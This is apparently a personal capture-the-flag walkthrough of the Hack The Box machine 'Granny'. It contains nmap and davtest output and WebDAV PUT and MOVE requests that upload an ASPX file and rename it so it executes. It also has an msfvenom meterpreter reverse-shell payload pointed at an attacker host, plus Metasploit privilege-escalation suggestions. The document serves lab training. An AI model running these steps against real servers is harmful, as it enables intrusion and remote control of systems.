<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>10.10.10.15 Granny</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>10.10.10.15 Granny</h1><br/>root@kali:~/Desktop/Machines/HTB/Granny# nmap -sC -sV -oN Granny.txt 10.10.10.15<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-07-18 22:04 EDT<br />Nmap scan report for 10.10.10.15<br />Host is up (0.14s latency).<br />Not shown: 999 filtered ports<br />PORT   STATE SERVICE VERSION<br />80/tcp open  http    Microsoft IIS httpd 6.0<br />| http-methods: <br />|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT<br />|_http-server-header: Microsoft-IIS/6.0<br />|_http-title: Under Construction<br />| http-webdav-scan: <br />|   WebDAV type: Unkown<br />|   Server Type: Microsoft-IIS/6.0<br />|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH<br />|   Server Date: Fri, 19 Jul 2019 02:04:13 GMT<br />|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK<br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 22.09 seconds<br /><br />root@kali:~/Desktop/Machines/HTB/Granny# davtest -url <a href="http://10.10.10.15">http://10.10.10.15</a><br />********************************************************<br /> Testing DAV connection<br />OPEN		SUCCEED:		<a href="http://10.10.10.15">http://10.10.10.15</a><br />********************************************************<br />NOTE	Random string for this session: _wsI2nxsiK<br />********************************************************<br /> Creating directory<br />MKCOL		SUCCEED:		Created <a href="http://10.10.10.15/DavTestDir__wsI2nxsiK">http://10.10.10.15/DavTestDir__wsI2nxsiK</a><br />********************************************************<br /> Sending test files<br />PUT	shtml	FAIL<br />PUT	pl	SUCCEED:	<a href="http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.pl">http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.pl</a><br />PUT	cfm	SUCCEED:	<a href="http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.cfm">http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.cfm</a><br />PUT	asp	FAIL<br />PUT	html	SUCCEED:	<a href="http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.html">http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.html</a><br />PUT	jsp	SUCCEED:	<a href="http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.jsp">http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.jsp</a><br />PUT	php	SUCCEED:	<a href="http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.php">http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.php</a><br />PUT	jhtml	SUCCEED:	<a href="http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.jhtml">http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.jhtml</a><br />PUT	cgi	FAIL<br />PUT	txt	SUCCEED:	<a href="http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.txt">http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.txt</a><br />PUT	aspx	FAIL<br />********************************************************<br /> Checking for test file execution<br />EXEC	pl	FAIL<br />EXEC	cfm	FAIL<br />EXEC	html	SUCCEED:	<a href="http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.html">http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.html</a><br />EXEC	jsp	FAIL<br />EXEC	php	FAIL<br />EXEC	jhtml	FAIL<br />EXEC	txt	SUCCEED:	<a href="http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.txt">http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.txt</a><br /><br />********************************************************<br />/usr/bin/davtest Summary:<br />Created: <a href="http://10.10.10.15/DavTestDir__wsI2nxsiK">http://10.10.10.15/DavTestDir__wsI2nxsiK</a><br />PUT File: <a href="http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.pl">http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.pl</a><br />PUT File: <a href="http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.cfm">http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.cfm</a><br />PUT File: <a href="http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.html">http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.html</a><br />PUT File: <a href="http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.jsp">http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.jsp</a><br />PUT File: <a href="http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.php">http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.php</a><br />PUT File: <a href="http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.jhtml">http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.jhtml</a><br />PUT File: <a href="http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.txt">http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.txt</a><br />Executes: <a href="http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.html">http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.html</a> &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;<br />Executes: <a href="http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.txt">http://10.10.10.15/DavTestDir__wsI2nxsiK/davtest__wsI2nxsiK.txt</a>    &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;<br /><br />Rerun davtest, while being proxied through burp so I can steal the put method<br />root@kali:~/Desktop/Machines/HTB/Granny# davtest -url <a href="http://localhost">http://localhost</a><br />********************************************************<br /> Testing DAV connection<br />OPEN		SUCCEED:		<a href="http://localhost">http://localhost</a><br />********************************************************<br />NOTE	Random string for this session: 0Ol1n31HpPyg<br />********************************************************<br /> Creating directory<br />MKCOL		SUCCEED:		Created <a href="http://localhost/DavTestDir_0Ol1n31HpPyg">http://localhost/DavTestDir_0Ol1n31HpPyg</a><br />********************************************************<br /> Sending test files<br />PUT	aspx	FAIL<br />PUT	cfm	SUCCEED:	<a href="http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.cfm">http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.cfm</a><br />PUT	txt	SUCCEED:	<a href="http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.txt">http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.txt</a><br />PUT	shtml	FAIL<br />PUT	jhtml	SUCCEED:	<a href="http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.jhtml">http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.jhtml</a><br />PUT	html	SUCCEED:	<a href="http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.html">http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.html</a><br />PUT	cgi	FAIL<br />PUT	asp	FAIL<br />PUT	php	SUCCEED:	<a href="http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.php">http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.php</a><br />PUT	pl	SUCCEED:	<a href="http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.pl">http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.pl</a><br />PUT	jsp	SUCCEED:	<a href="http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.jsp">http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.jsp</a><br />********************************************************<br /> Checking for test file execution<br />EXEC	cfm	FAIL<br />EXEC	txt	SUCCEED:	<a href="http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.txt">http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.txt</a><br />EXEC	jhtml	FAIL<br />EXEC	html	SUCCEED:	<a href="http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.html">http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.html</a><br />EXEC	php	FAIL<br />EXEC	pl	FAIL<br />EXEC	jsp	FAIL<br /><br />********************************************************<br />/usr/bin/davtest Summary:<br />Created: <a href="http://localhost/DavTestDir_0Ol1n31HpPyg">http://localhost/DavTestDir_0Ol1n31HpPyg</a><br />PUT File: <a href="http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.cfm">http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.cfm</a><br />PUT File: <a href="http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.txt">http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.txt</a><br />PUT File: <a href="http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.jhtml">http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.jhtml</a><br />PUT File: <a href="http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.html">http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.html</a><br />PUT File: <a href="http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.php">http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.php</a><br />PUT File: <a href="http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.pl">http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.pl</a><br />PUT File: <a href="http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.jsp">http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.jsp</a><br />Executes: <a href="http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.txt">http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.txt</a><br />Executes: <a href="http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.html">http://localhost/DavTestDir_0Ol1n31HpPyg/davtest_0Ol1n31HpPyg.html</a><br /><br /><br /><br />edited put request in burp...<br />    REQUEST<br />PUT /CoolHandSquid.html HTTP/1.1<br />TE: deflate,gzip;q=0.3<br />Connection: close<br />Host: localhost:80<br />User-Agent: DAV.pm/v0.49<br />Content-Length: 32<br />HTML put via coolhandsquid                                <br /><br />    RESPONCE<br />HTTP/1.1 201 Created<br />Connection: close<br />Date: Fri, 19 Jul 2019 02:31:55 GMT<br />Server: Microsoft-IIS/6.0<br />MicrosoftOfficeWebServer: 5.0_Pub<br />X-Powered-By: ASP.NET                                               &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;now we know .asp will be executed<br />Location: <a href="http://localhost/CoolHandSquid.html">http://localhost/CoolHandSquid.html</a><br />Content-Length: 0<br />Allow: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, LOCK, UNLOCK<br />                    <br />                    <br />                                                                     success, can browse to http://10.10.10.15:80/CoolHandSquid.html<br /><br />msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.60 LPORT=3232 -f aspx -o AspxShell.txt<br />copy shellcode into previous request and GO<br />when you navigate to the web page you will need to click “view page source”<br /><br />Now move Coolhandsquid.html to Coolhandsquid.aspx<br /><br />MOVE /Coolhandsquid.html HTTP/1.1<br />Destination: /Coolhandsquid.aspx<br />TE: deflate,gzip;q=0.3<br />Connection: close<br />Host: localhost:80<br />User-Agent: DAV.pm/v0.49<br />Content-Length: 2787<br /><br />run<br />start multi handler<br />navigate to website<br />enjoy network service shell<br /><br />use post/multi/recon/local_exploit_suggester<br />[*] 10.10.10.15 - Collecting local exploits for x86/windows...<br />[*] 10.10.10.15 - 29 exploit checks are being tried...<br />[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The target service is running, but could not be validated.<br />[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.<br />[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.<br />[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;<br />[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The target service is running, but could not be validated.<br />[+] 10.10.10.15 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated.<br />[+] 10.10.10.15 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.<br />[+] 10.10.10.15 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.<br />[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.<br />[*] Post module execution completed<br /><br /><br /><br />Enjoy your system shell<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /></div></body></html>